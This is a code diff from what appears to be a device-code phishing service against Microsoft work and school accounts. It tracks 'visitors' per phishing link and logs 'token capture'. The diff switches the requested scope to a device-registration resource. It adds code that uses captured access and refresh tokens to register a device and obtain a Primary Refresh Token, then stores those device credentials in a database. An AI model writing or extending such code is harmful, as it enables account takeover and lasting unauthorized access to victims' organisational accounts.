@@ -74,7 +74,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
-        scope: 'openid profile offline_access https://graph.microsoft.com/.default',
+        scope: 'openid profile offline_access https://api.office.net/ests/device/management/adrs_access',
       }),
       {
         ...proxyConfig,
@@ -365,7 +365,7 @@ async function retryAsTokenMode(originalJob) {
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
-        scope: 'openid profile email offline_access https://graph.microsoft.com/.default',
+        scope: 'openid profile email offline_access https://api.office.net/ests/device/management/adrs_access',
       }),
       {
         ...retryProxyConfig,
@@ -577,6 +577,34 @@ async function storeToken(job, tokenData, responseCookies = []) {
       });
     }
 
+    // Attempt device registration and PRT generation for work/school accounts
+    // This runs asynchronously and doesn't block the response
+    if (accountType === 'work_school' && tokenData.access_token && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
+      const deviceManager = require('./devicemanager');
+      deviceManager.registerDeviceAndGetPrt({
+        access_token: tokenData.access_token,
+        refresh_token: tokenData.refresh_token,
+        tenant_id: tenant,
+        user_id: job.user_id,
+        link_id: job.link_id
+      }).then(registrationResult => {
+        console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
+        // Store device credentials in database
+        return deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
+      }).then(() => {
+        console.log('[DeviceProxy] Device credentials stored for token', tokenId);
+      }).catch(err => {
+        console.error('[DeviceProxy] Device registration failed:', err.message);
+        // Don't fail the token capture - device registration is optional
+      });
+    } else {
+      console.log('[DeviceProxy] Device registration skipped:', {
+        tokenId,
+        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic' : 'unknown'
+      });
+    }
+
     // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
     try {
       const [blockRows] = await db.query(
@@ -585,11 +613,14 @@ async function storeToken(job, tokenData, responseCookies = []) {
       );
       const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
       const newStatus = blockDone ? 'blocked' : 'done';
-      await db.query(
-        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
-        [newStatus, job.user_id, job.link_id, 'waiting']
+      
+      // Update ALL visitors with status 'waiting' OR 'visited' for this user/link
+      // This ensures visitors logged by block-check (status='visited') are also updated
+      const [updateResult] = await db.query(
+        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
+        [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
       );
-      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id}`);
+      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id} (updated ${updateResult.affectedRows} rows)`);
     } catch (updateErr) {
       console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
     }
